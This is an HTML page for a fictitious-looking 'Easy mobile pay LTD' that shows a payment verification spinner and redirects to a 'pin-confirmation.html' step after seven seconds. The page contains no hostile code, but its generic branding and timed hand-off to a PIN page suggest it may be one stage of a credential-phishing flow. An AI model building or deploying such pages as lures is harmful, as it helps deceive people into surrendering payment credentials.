<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Payment Verification</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@500;700;800&display=swap" rel="stylesheet">
  <style>
    :root{--bg:#f7f8fa;--dark:#1a1f2b;--muted:#6b7280;--orange1:#FFA500;--orange2:#FF6B00}
    *{box-sizing:border-box} html,body{height:100%}
    body{margin:0;background:var(--bg);color:var(--dark);font-family:Inter, "Noto Sans", system-ui, -apple-system, Segoe UI, Roboto, sans-serif;display:grid;place-items:center}
    .wrap{width:100%;max-width:520px;padding:24px;text-align:center;animation:fade .5s ease both}
    .loader{width:92px;height:92px;border-radius:50%;position:relative;margin:0 auto 16px;background:conic-gradient(from 0deg, var(--orange1), var(--orange2))}
    .loader::before{content:"";position:absolute;inset:6px;background:var(--bg);border-radius:50%}
    .spin{position:absolute;inset:0;border-radius:50%;animation:rotate 1.2s linear infinite}
    h1{margin:8px 0 6px;font-weight:800;font-size:22px}
    p{margin:0;color:var(--muted);font-size:14px}
    .bar{height:4px;background:#1f2937;opacity:.9;border-radius:999px;margin:18px 0 10px;overflow:hidden}
    .bar > span{display:block;height:100%;width:30%;background:linear-gradient(90deg,var(--orange1),var(--orange2));animation:load 7s ease-in-out infinite}
    .tips{color:#9aa0a6;font-size:12px;display:flex;flex-direction:column;gap:4px;margin-top:8px}
    .foot{position:fixed;left:0;right:0;bottom:14px;text-align:center;font-weight:800;color:#2a2f3a}
    .chat{position:fixed;right:16px;bottom:80px;width:56px;height:56px;border-radius:50%;background:linear-gradient(135deg,var(--orange1),var(--orange2));display:grid;place-items:center;box-shadow:0 10px 24px rgba(255,107,0,0.35);border:0}
    .tip{position:fixed;right:16px;bottom:144px;background:#111;color:#fff;padding:8px 10px;border-radius:10px;font-size:12px;opacity:0;transform:translateY(6px);transition:opacity .2s, transform .2s}
    .tip.show{opacity:1;transform:translateY(0)}
    @keyframes rotate{to{transform:rotate(360deg)}}
    @keyframes load{0%{transform:translateX(-40%)}100%{transform:translateX(340%)}}
    @keyframes fade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
  </style>
</head>
<body>
  <main class="wrap" aria-label="Payment verification">
    <div class="loader" aria-hidden="true"><div class="spin"></div></div>
    <h1>Confirming Your Payment</h1>
    <p>Please wait while we verify your transactionâ€¦</p>
    <div class="bar" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-label="Verification progress"><span></span></div>
    <div class="tips" aria-live="polite">
      <span>This may take a few moments</span>
      <span>Please do not close this page</span>
    </div>
  </main>

  <div class="foot">Easy mobile pay LTD</div>

  <button id="chat" class="chat" aria-label="Chat">
    <svg width="26" height="26" viewBox="0 0 24 24" fill="#fff" xmlns="http://www.w3.org/2000/svg"><path d="M21 15a4 4 0 01-4 4H7l-4 3V6a4 4 0 014-4h10a4 4 0 014 4v9z" fill-opacity=".22"/><path d="M7 8h10M7 12h7" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg>
  </button>
  <div id="tooltip" class="tip" role="status">Need help?</div>

  <script>
    // Tooltip toggle
    const chat=document.getElementById('chat'); const tip=document.getElementById('tooltip');
    chat.addEventListener('click',()=>{ tip.classList.add('show'); setTimeout(()=>tip.classList.remove('show'), 1600); });
    // Auto-advance after ~7s
    setTimeout(()=>{ window.location.href='pin-confirmation.html'; }, 7000);
  </script>
</body>
</html>
